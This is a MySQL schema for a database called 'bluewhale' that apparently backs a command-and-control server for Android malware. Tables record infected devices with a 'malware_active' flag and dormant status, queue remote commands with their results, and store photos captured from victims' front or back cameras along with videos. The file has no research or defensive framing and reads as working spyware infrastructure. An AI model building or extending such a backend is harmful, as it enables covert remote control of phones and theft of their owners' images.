CREATE DATABASE IF NOT EXISTS bluewhale CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE bluewhale;

CREATE TABLE IF NOT EXISTS devices (
                                       id VARCHAR(64) PRIMARY KEY,
    device_name VARCHAR(128),
    android_version VARCHAR(64),
    manufacturer VARCHAR(128),
    model VARCHAR(128),
    permissions_granted TEXT,
    active BOOLEAN DEFAULT FALSE,
    malware_active BOOLEAN DEFAULT FALSE,
    first_seen DATETIME,
    last_seen DATETIME,
    activation_time DATETIME,
    ip_address VARCHAR(64),
    status VARCHAR(32) DEFAULT 'dormant'
    );

CREATE TABLE IF NOT EXISTS commands (
                                        id BIGINT AUTO_INCREMENT PRIMARY KEY,
                                        device_id VARCHAR(64) NOT NULL,
    command VARCHAR(64) NOT NULL,
    params TEXT,
    issued_at DATETIME,
    status VARCHAR(32) DEFAULT 'pending',
    result TEXT,
    INDEX idx_device (device_id),
    INDEX idx_status (status)
    );

CREATE TABLE IF NOT EXISTS photos (
                                      id BIGINT AUTO_INCREMENT PRIMARY KEY,
                                      device_id VARCHAR(64) NOT NULL,
    file_path VARCHAR(512) NOT NULL,
    file_size BIGINT,
    captured_at DATETIME,
    uploaded_at DATETIME,
    camera VARCHAR(32) DEFAULT 'back',
    INDEX idx_device (device_id)
    );

CREATE TABLE IF NOT EXISTS videos (
                                      id BIGINT AUTO_INCREMENT PRIMARY KEY,
                                      filename VARCHAR(128) NOT NULL,
    file_path VARCHAR(512) NOT NULL,
    file_size BIGINT,
    type VARCHAR(32),
    metadata TEXT,
    download_count INT DEFAULT 0
    );